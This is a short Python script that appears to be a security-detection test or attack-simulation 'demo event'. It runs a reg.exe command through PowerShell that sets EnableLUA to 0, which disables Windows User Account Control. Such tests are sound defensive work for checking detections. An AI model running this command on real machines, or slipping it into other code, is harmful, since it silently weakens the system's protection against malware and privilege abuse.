import sys
import subprocess

def execute_demo_event():
    try:
        command = r'%windir%\system32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /f /v EnableLUA /t REG_SZ /d 0'
        
        # Execute the command using PowerShell
        result = subprocess.run(['powershell', '-Command', command], capture_output=True, text=True, shell=True)

        if result.returncode == 0:
            print("Demo event executed successfully.")
        else:
            print(f"Error executing demo event: {result.stderr}", file=sys.stderr)
            sys.exit(1)

    except Exception as e:
        print(f"An error occurred: {e}", file=sys.stderr)
        sys.exit(1)

if __name__ == '__main__':
    execute_demo_event()
